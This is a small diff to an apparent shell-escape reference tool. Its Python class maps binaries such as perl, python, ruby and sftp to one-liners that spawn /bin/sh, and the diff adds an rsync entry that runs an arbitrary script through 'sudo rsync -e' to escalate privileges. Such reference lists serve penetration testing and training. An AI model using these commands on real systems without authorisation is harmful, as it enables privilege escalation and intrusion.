@@ -32,6 +32,7 @@ class Binaries():
 			('perl', 	'$ perl -e \'exec "/bin/sh";\''),
 			('python', 	'$ python -c \'import os;os.system("/bin/sh")\''),
 			('rbash', 	'$ /bin/rbash'),
+			('rsync', 	'$ echo "whoami > /tmp/whoami" > /tmp/tmpfile\nsudo rsync  -e \'sh /tmp/tmpfile\' /dev/null 127.0.0.1:/dev/null 2>/dev/null\ncat whoami '),
 			('ruby', 	'$ ruby -e \'exec "/bin/sh"\''),
 			('sftp', 	'$ ftp> ! ls'),
 			('sh', 		'$ /bin/sh'),
